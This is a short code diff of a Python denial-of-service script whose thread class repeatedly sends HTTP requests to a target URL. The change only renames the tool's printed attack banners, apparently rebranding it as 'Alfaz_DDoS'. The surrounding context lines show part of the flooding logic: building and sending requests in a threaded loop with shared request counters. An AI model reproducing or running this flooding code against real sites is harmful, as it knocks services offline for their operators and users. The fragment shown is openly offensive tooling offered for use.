@@ -64,7 +64,7 @@ class fucker(threading.Thread):
         urllib.request.install_opener(opener) 
         req = urllib.request.Request(self.url, data, self.headers)
         urllib.request.urlopen(req)
-        print("[alfaz_ddos] Attack [%s]\r"%(self.url))
+        print("[Alfaz_ddos] Attack [%s]\r"%(self.url))
             
     def run(self):
         global Close, Request, Tot_req
@@ -74,7 +74,7 @@ class fucker(threading.Thread):
             try:
                 self.request()
             except:
-                sys.stdout.write("[USNEXUS] Attack [%s]\r"%(self.url))
+                sys.stdout.write("[ALFAZ_DDoS] Attack [%s]\r"%(self.url))
                 sys.exit(0)
         sys.exit(0)
 
